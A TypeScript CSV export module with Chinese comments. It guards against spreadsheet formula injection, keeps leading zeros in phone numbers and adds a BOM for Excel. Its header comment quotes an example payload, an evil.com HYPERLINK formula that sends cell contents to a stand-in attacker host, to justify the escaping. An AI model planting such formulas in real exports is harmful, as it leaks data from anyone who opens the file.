/**
 * CSV 匯出。
 *
 * 這支處理三個「不做就會出事、但測試不會抓到」的問題：
 *
 * 1. **CSV injection** — 值若以 = + - @ 開頭，Excel／Sheets 會當成公式執行。
 *    客人的姓名欄位是使用者輸入，`=HYPERLINK("http://evil.com?"&A1,"點我")`
 *    這種東西會在員工打開名單時真的跑起來。前面補一個單引號讓它變純文字。
 *
 * 2. **Excel 吃掉電話開頭的 0** — `0912345678` 被當成數字，開檔就變 912345678，
 *    客服照著打會打不通。包成 `="0912345678"` 強制文字。
 *
 * 3. **UTF-8 中文亂碼** — Excel 不看 charset，只看 BOM。沒有 BOM 的話
 *    「劉柳樺」會變成一堆問號。
 *
 * 換行一律用 CRLF（RFC 4180），Excel 對 LF 的相容性不穩。
 */

const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

/** 單一儲存格逸出。forceText 用於電話、訂單編號這類「看起來像數字但不是」的欄位。 */
export function csvCell(
  value: unknown,
  opts: { forceText?: boolean } = {},
): string {
  if (value === null || value === undefined) return "";
  let s = String(value);

  // 先擋公式，再考慮引號 —— 順序不能反，否則單引號會被包進引號裡失去效果
  if (FORMULA_PREFIXES.some((p) => s.startsWith(p))) {
    s = "'" + s;
  }

  if (opts.forceText) {
    // ="0912345678" 這種寫法本身含有雙引號，要先逸出內部的引號
    return `="${s.replace(/"/g, '""')}"`;
  }

  if (/[",\r\n]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

export type CsvColumn<T> = {
  header: string;
  value: (row: T) => unknown;
  /** 電話、訂單編號這類開頭可能是 0 或看起來像日期的欄位 */
  forceText?: boolean;
};

export function toCsv<T>(rows: readonly T[], columns: CsvColumn<T>[]): string {
  const lines: string[] = [];
  lines.push(columns.map((c) => csvCell(c.header)).join(","));
  for (const row of rows) {
    lines.push(
      columns
        .map((c) => csvCell(c.value(row), { forceText: c.forceText }))
        .join(","),
    );
  }
  // BOM + CRLF：兩者都是為了 Excel
  return "﻿" + lines.join("\r\n") + "\r\n";
}

/**
 * Content-Disposition 的檔名。
 * 中文檔名一定要走 RFC 5987 的 filename*，只給 filename 的話瀏覽器會存成亂碼；
 * 同時保留一個 ASCII 版 filename 給不支援的舊瀏覽器。
 */
export function csvContentDisposition(filename: string): string {
  const ascii = filename.replace(/[^\x20-\x7E]/g, "_").replace(/"/g, "");
  return `attachment; filename="${ascii}"; filename*=UTF-8''${encodeURIComponent(filename)}`;
}

export const CSV_CONTENT_TYPE = "text/csv; charset=utf-8";
